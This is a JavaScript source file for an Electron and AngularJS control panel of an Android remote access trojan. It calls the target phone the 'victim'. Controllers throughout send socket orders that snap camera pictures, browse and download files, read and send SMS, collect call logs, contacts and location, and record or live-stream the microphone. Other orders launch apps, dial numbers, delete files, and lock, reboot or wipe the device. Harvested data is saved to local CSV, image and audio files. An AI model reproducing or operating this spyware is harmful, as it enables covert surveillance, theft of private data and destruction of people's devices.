const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const CUSTOM_FUNCTIONS = require(__dirname + '/assets/js/CustomFunctions');
var ORDER = CONSTANTS.order;
var socket = remote.getCurrentWebContents().victim;
var homeDir = require('homedir');
var path = require("path");

var fileSystem = require("fs");
var wav = require('wav');
var Speaker = require('speaker');

var audioDataBuffer = [];
var audioStream = null;

var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/installedApps", {
            templateUrl: "./views/installedApps.html",
            controller: "AppsCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        })
        .when("/utilities", {
            templateUrl: "./views/utilities.html",
            controller: "UtilitiesCtrl"
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = remote.getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };


    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });


    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }
});






//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    var camera = CONSTANTS.orders.camera;

    // remove socket listner if the camera page is changed or destroied
    $camCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(camera);
    });


    $rootScope.Log('Get cameras list');
    $camCtrl.load = 'loading';
    // send order to victim to bring camera list
    socket.emit(ORDER, { order: camera, extra: 'camList' });



    // wait any response from victim
    socket.on(camera, (data) => {
        if (data.camList == true) { // the rseponse is camera list
            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[1];
            $camCtrl.$apply();
        } else if (data.image == true) { // the rseponse is picture

            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);

            // convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                $rootScope.Log('Saving picture..');
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);

                });

            }

        }
    });


    $camCtrl.snap = () => {
        // send snap request to victim
        $rootScope.Log('Snap a picture');
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }
});






//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    var fileManager = CONSTANTS.orders.fileManager;


    // remove socket listner
    $fmCtrl.$on('$destroy', () => {
        // release resources
        socket.removeAllListeners(fileManager);
    });

    // limit the ng-repeat
    // infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    // send request to victim to bring files
    $rootScope.Log('Get files list');
    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(fileManager, (data) => {
        if (data.file == true) { // response with file's binary
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });

        } else if (data.length != 0) { // response with files list
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }

    });


    // when foder is clicked
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
        }
    };

    // when save button is clicked
    // send request to bring file's' binary
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
    }

});





//---------------------- Image Controller (image.html)----------------------

app.controller("ImageCtrl", function ($scope, $rootScope) {

    $ImageCtrl = $scope;
    var images = CONSTANTS.orders.images;
});



//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log('Sending SMS..');
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }


    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
        }
    });



});









//-----------------------Apps Controller (installedApps.htm)------------------------
// Apps controller
app.controller("AppsCtrl", function ($scope, $rootScope) {
    $AppsCtrl = $scope;
    $AppsCtrl.appsList = [];
    var apps = CONSTANTS.orders.apps;
    var runApp = CONSTANTS.orders.runApp;

    $AppsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(apps);
        socket.removeAllListeners(runApp);
    });

    $AppsCtrl.load = 'loading';
    $rootScope.Log('Get Apps list..');
    socket.emit(ORDER, { order: apps });


    $AppsCtrl.barLimit = 50;
    $AppsCtrl.increaseLimit = () => {
        $AppsCtrl.barLimit += 50;
    }


    $AppsCtrl.SaveAppInfo = () => {
        if ($AppsCtrl.appsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $AppsCtrl.appsList.length; i++) {
            var package_name = $AppsCtrl.appsList[i].packageName;
            var app_name = (($AppsCtrl.appsList[i].appName) == "" ? "No App Name" : $AppsCtrl.appsList[i].appName);
            var version_name = $AppsCtrl.appsList[i].versionName;
            csvRows.push("App: " + app_name + ",\t" + "Package: " + package_name + ",\t" + "Version: " + version_name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "AppsInfo_" + Date.now() + ".csv");
        $rootScope.Log("Saving Apps Info List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Apps Info List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    $AppsCtrl.RunApp = (app_name, app_package_name) => {
        $rootScope.Log('Launching ' + app_name);
        socket.emit(ORDER, { order: runApp, extra: app_package_name });
    }

    socket.on(apps, (data) => {
        if (data.appsList) {
            $AppsCtrl.load = '';
            $rootScope.Log('Apps list arrived', CONSTANTS.logStatus.SUCCESS);
            $AppsCtrl.appsList = data.appsList;
            $AppsCtrl.totalAppsSize = data.appsList.length;
            $AppsCtrl.$apply();
        }
    });

    socket.on(runApp, (data) => {

        if (data.launchingStatus == true) {
            $rootScope.Log('App launched successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to launch app..", CONSTANTS.logStatus.FAIL);
        }
    });



});




//-----------------------Utilities Controller (utilities.html)------------------------

app.controller("UtilitiesCtrl", function ($scope, $rootScope) {

    $UtilitiesCtrl = $scope;
    $UtilitiesCtrl.utils = [];

    var openUrl = CONSTANTS.orders.openUrl;
    var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;
    var dialNumber = CONSTANTS.orders.dialNumber;
    var lockDevice = CONSTANTS.orders.lockDevice;
    var wipeDevice = CONSTANTS.orders.wipeDevice;
    var rebootDevice = CONSTANTS.orders.rebootDevice;
    var listenMicrophone = CONSTANTS.orders.listenMicrophone;

    $UtilitiesCtrl.$on('$destroy', () => {
        socket.removeAllListeners(openUrl);
        socket.removeAllListeners(deleteFileFolder);
        socket.removeAllListeners(dialNumber);
        socket.removeAllListeners(lockDevice);
        socket.removeAllListeners(wipeDevice);
        socket.removeAllListeners(rebootDevice);
        socket.removeAllListeners(listenMicrophone);
    });


    $UtilitiesCtrl.OpenURL = (url) => {

        if (CUSTOM_FUNCTIONS.isValidURL(url)) {

            $rootScope.Log('Opening url..');
            socket.emit(ORDER, { order: openUrl, url: url });
        }
        else {
            $rootScope.Log('Invalid URL..', CONSTANTS.logStatus.FAIL);
        }
    }

    socket.on(openUrl, (data) => {
        if (data.status == true) {
            $rootScope.Log('URL opened successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to open url..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.DeleteFileFolder = (fileFolderPath) => {

        $rootScope.Log('Deleting path "' + fileFolderPath + '"');
        socket.emit(ORDER, { order: deleteFileFolder, fileFolderPath: fileFolderPath });
    }

    socket.on(deleteFileFolder, (data) => {
        if (data.status == true) {
            $rootScope.Log('Deleted successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to delete..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.DialNumber = (number) => {

        $rootScope.Log('Dialing to ' + number);
        socket.emit(ORDER, { order: dialNumber, number: number });
    }

    socket.on(dialNumber, (data) => {
        if (data.status == true) {
            $rootScope.Log('Successfully dialed number..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to dial number..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.LockDevice = () => {

        $rootScope.Log('Locking device..');
        socket.emit(ORDER, { order: lockDevice });
    }

    socket.on(lockDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.WipeDevice = () => {

        if (confirm("Are you sure, you want to wipe out the victim?")) {

            $rootScope.Log('Wiping victim\'s device..');
            socket.emit(ORDER, { order: wipeDevice });
        }
        else {
            $rootScope.Log("You have choosen cancel.");
        }
    }

    socket.on(wipeDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.RebootDevice = () => {

        if (confirm("Confirm by pressing okay.")) {

            $rootScope.Log('Rebooting victim\'s device..');
            socket.emit(ORDER, { order: rebootDevice });
        }
        else {
            $rootScope.Log("You have choosen cancel.");
        }
    }

    socket.on(rebootDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.ListenMic = () => {
        socket.emit(ORDER, { order: listenMicrophone });
    }

    let audioFilePath;

    socket.on('audioData', (data) => {

        // Decode the base64 audio data and push it to the buffer
        const audioBuffer = Buffer.from(data, 'base64');
        audioDataBuffer.push(audioBuffer);

        if (!audioStream) {

            audioFilePath = path.join(downloadsPath, "recording_" + Date.now() + ".wav");

            audioStream = new wav.FileWriter(audioFilePath, {
                sampleRate: 44100, // Adjust sample rate as needed
                channels: 1, // Mono audio
                bitDepth: 16, // 16-bit audio
            });

            speaker = new Speaker({
                channels: data.channels || 1,
                bitDepth: data.bitDepth || 16,
                sampleRate: data.sampleRate || 44100,
            });

            audioStream.pipe(speaker);

            $rootScope.Log('Listening microphone...');
        }

        audioStream.write(audioBuffer);

    });


    socket.on('audioDataStop', () => {

        if (audioStream) {

            audioStream.end();

            setTimeout(() => {
                audioStream = null;
                $rootScope.Log('Recording saved on ' + audioFilePath, CONSTANTS.logStatus.SUCCESS);
            }, 1000);
        }
    });


});






//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('Get Calls list..');
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];

        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {

            var type;

            if ($CallsCtrl.callsList[i].type == 1) {
                type = "INCOMING";
            }else if($CallsCtrl.callsList[i].type == 3){
                type = "MISSED";
            } else {
                type = "OUTGOING";
            }

            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("Saving Calls List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });



});





//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('Get Contacts list..');
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("Saving Contacts List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });





});




//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log('Recording ' + seconds + "'s...");
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('Seconds must be more than 0');

        }

    }


    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('Saving file..');
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });
            };
        }
    });
});





//-----------------------Location Controller (location.htm)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });


    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {

        $LocCtrl.load = 'loading';
        $rootScope.Log('Get Location..');
        socket.emit(ORDER, { order: location });

    }



    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });


    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();

                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);

    });

});